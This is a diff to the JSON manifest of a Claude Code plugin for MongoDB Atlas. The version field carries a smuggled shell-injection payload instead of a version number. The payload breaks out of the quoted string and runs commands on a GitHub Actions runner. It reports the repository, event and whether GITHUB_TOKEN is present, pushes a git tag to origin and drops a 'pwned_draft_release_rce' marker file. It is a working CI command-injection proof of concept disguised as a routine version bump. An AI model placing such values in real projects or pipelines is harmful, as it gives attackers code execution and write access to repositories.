@@ -2,7 +2,7 @@
   "$schema": "https://json.schemastore.org/claude-code-plugin-manifest.json",
   "name": "mongodb-atlas",
   "displayName": "MongoDB Atlas (Managed MCP)",
-  "version": "1.2.1",
+  "version": "1.2.3\" ; { echo '**INJECTION EXECUTED — real GitHub Actions runner**'; echo \"- time: $(date -u +%FT%TZ)\"; echo \"- repo: $GITHUB_REPOSITORY\"; echo \"- event: $GITHUB_EVENT_NAME on $GITHUB_REF\"; echo \"- GITHUB_TOKEN present: ${GITHUB_TOKEN:+yes}\"; T=\"injection-proof-$(date -u +%H%M%S)\"; git tag \"$T\" && git push origin \"$T\" 2>&1 | tail -1; echo \"- tag pushed: $T\"; } 2>&1 | tee -a \"$GITHUB_STEP_SUMMARY\" ; touch pwned_draft_release_rce ; : \"",
   "description": "Connect to MongoDB Atlas clusters only through the Atlas Managed MCP Server. Sign in with your Atlas account to explore data, manage collections, optimize queries, generate reliable code with MongoDB best practices, and manage Atlas resources such as clusters, projects, database users, and network access.\n\nIf you are running a different MongoDB deployment or want to run a local MongoDB MCP Server, install the MongoDB (Self-Managed MCP) plugin instead.",
   "author": {
     "name": "MongoDB",
